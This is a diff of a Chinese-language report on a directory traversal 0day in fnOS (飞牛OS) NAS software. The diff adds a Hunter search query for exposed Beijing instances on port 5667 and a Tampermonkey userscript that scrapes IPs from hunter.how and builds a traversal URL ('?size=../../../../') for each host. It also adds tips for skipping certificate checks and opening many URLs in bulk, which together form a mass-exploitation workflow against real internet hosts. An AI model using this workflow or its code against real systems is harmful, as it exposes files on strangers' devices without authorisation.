@@ -2,7 +2,6 @@
 title: "飞牛OS (fnOS) 目录遍历 0day 漏洞复现与分析报告"
 date: 2026-02-03
 ---
-# 飞牛OS (fnOS) 目录遍历 0day 漏洞复现与分析报告
 
 ## 0x01 背景概述
 
@@ -20,7 +19,7 @@ date: 2026-02-03
 利用网络空间测绘引擎，可以快速定位全球范围内开启了 Web 服务的飞牛 OS 实例。
 
 * **方法一：使用 Hunter (鹰图)**
-* 查询语法：`iweb.title="飞牛" and ip.port=="5667" and ip.state="beijing"`
+* 查询语法：`web.title="飞牛" and ip.port=="5667" and ip.state="beijing"`
 * **原理：** 针对特定标题、默认 HTTPS 端口（5667） 及地理位置进行组合搜索。
 
 
@@ -47,6 +46,66 @@ URL 中的 `%7B0%7D` 代表占位符 `{0}`。通过在 `size` 参数中输入连
 ## 0x03 辅助渗透工具 (油猴脚本)
 
 为了提高在目录遍历过程中的验证效率，可配合以下两款工具使用。
+### 抓取Hunter.how IP 并且拼接工具
+**功能：** 抓取 IP 并拼接特定的测试 URL 模板
+
+
+```js
+// ==UserScript==
+// @name         Hunter.how IP 拼接工具 (Custom URL)
+// @namespace    http://tampermonkey.net/
+// @version      1.1
+// @description  抓取 IP 并拼接特定的测试 URL 模板
+// @author       Gemini
+// @match        https://hunter.how/list*
+// @grant        GM_setClipboard
+// @grant        GM_notification
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    // 配置你的 URL 模板
+    // {ip} 会被替换成抓取到的 IP 地址
+    const urlTemplate = "https://{ip}:5667/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../";
+
+    const btn = document.createElement('button');
+    btn.innerHTML = '提取并拼接 URL';
+    btn.style.cssText = 'position:fixed;bottom:100px;right:20px;z-index:9999;padding:10px 15px;background-color:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,0.3);';
+
+    document.body.appendChild(btn);
+
+    btn.onclick = function() {
+        const ipRegex = /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g;
+
+        // 缩小范围至搜索结果列表，避免抓取到无关 IP
+        const searchContainer = document.querySelector('.ant-list') || document.body;
+        const text = searchContainer.innerText;
+
+        const matches = text.match(ipRegex) || [];
+        const uniqueIps = [...new Set(matches)];
+
+        if (uniqueIps.length > 0) {
+            // --- 核心修改部分：拼接 URL ---
+            const fullUrls = uniqueIps.map(ip => {
+                return urlTemplate.replace('{ip}', ip);
+            });
+
+            const resultString = fullUrls.join('\n');
+            GM_setClipboard(resultString);
+
+            GM_notification({
+                title: '处理完成',
+                text: `已生成 ${fullUrls.length} 条测试 URL 并复制`,
+                timeout: 3000
+            });
+            console.log('生成的 URL 列表：\n' + resultString);
+        } else {
+            alert('未在当前页面发现 IP 地址');
+        }
+    };
+})();
+```
 
 ### 1. 路径遍历链接修复工具
 
@@ -127,6 +186,15 @@ console.log(`已修正 ${links.length} 个路径遍历链接。`);
 })();
 
 ```
+
+### chromium 临时忽略https证书
+ 
+```bash
+chromium --ignore-certificate-errors
+```
+
+### Open Multiple URLs 快速打开多个url
+``Open Multiple URLs `` 插件，自行安装
 
 ---
 
